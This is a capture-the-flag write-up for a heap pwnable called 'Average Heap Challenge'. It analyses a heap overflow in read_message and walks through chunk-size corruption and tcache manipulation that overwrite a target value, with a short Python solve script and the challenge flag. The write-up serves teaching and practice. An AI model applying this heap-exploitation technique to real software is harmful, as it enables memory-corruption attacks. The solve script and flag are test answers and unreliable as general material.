# AHC - Average Heap Challenge

## 1. Summary

- **Category**: Pwnable
- **Points**: 484
- **Solves**: 98

### Description

> `I believe I'm not that good at math at this point...`

## 2. Analysis

### Checksec

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### Vulnerability

The application contains a hidden menu `5` that triggers `check_target()`. If the value at the `target` address is modified to `0xdeadbeefcafebabe`, it prints the flag.

```c
void check_target(void)
{
    if (*target == 0xdeadbeefcafebabe) {
        pcVar2 = getenv("FLAG");
        puts(pcVar2);
    }
}
```

The `setup_chall` function pre-allocates and frees five `0x50` chunks into the tcache, then allocates a 8-byte `target` chunk.

#### Memory Layout (Initial State)

After initialization, the heap and tcache bins are structured as follows:

**Heap Dump:**

```text
0x555555555290: 0x0000000000000000      0x0000000000000051
0x5555555552a0: 0x00005550000007a5      0x31c3af8c1a3c29b8 [Tcache 1]
...
0x5555555553d0: 0x0000000000000000      0x0000000000000051
0x5555555553e0: 0x0000000555555555      0x31c3af8c1a3c29b8 [Tcache 5]
...
0x555555555420: 0x0000000000000000      0x0000000000000021 [Target Chunk Header]
0x555555555430: 0xbabebabebabebabe      0x0000000000000000 [Target Value]
```

**Tcachebins:**
`Tcachebins[idx=3, size=0x50, count=5] ← 0x5555555552a0 ... ← 0x5555555553e0`

The vulnerability lies in `read_message()`, which uses a fixed `%39s` format string to write data starting from the end of the user-defined name buffer. This allows a **Heap Overflow** into the metadata of the adjacent chunk.

## 3. Exploit Flow

1. **Drain Tcache**: Allocate 5 players to consume all existing `0x50` chunks from the tcache.
2. **Chunk Size Corruption**: Delete and re-allocate Player 3. Use the overflow in `read_message` to overwrite the size field of Player 4's chunk from `0x51` to `0x71`.
3. **Tcache Poisoning**: Delete Player 4. Due to the corrupted size, it is placed into the `0x70` tcache bin instead of the `0x50` bin.
4. **Arbitrary Write**: Allocate a new player with a size that requests from the `0x70` bin. Since Player 4 was adjacent to the `target` chunk, the larger allocation allows us to overwrite the `target` memory area with `0xdeadbeefcafebabe`.
5. **Trigger Flag**: Invoke the hidden menu option to pass the `check_target` validation.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

```python
# 1. Drain Tcache
for i in range(5):
    create_player(r, i, 0, b"A", b"A")

# 2. Corrupt Player 4's chunk size (0x51 -> 0x71)
delete_player(r, 3)
create_player(r, 3, 0, b"A" * 0x27, b"A" * 0x20 + b"\x71")

# 3. Poison Tcache and Overwrite Target
delete_player(r, 4)
# Allocating from 0x70 bin allows us to reach the target address
create_player(r, 4, 0x20, b"A" * 0x47, b"A" * 8 + p64(0xDEADBEEFCAFEBABE))

# 4. Get Flag
check_target(r)
```

## 5. Flag

`pascalCTF{1m4g1n3_N0t_Kn0w1n9_H34P...}`
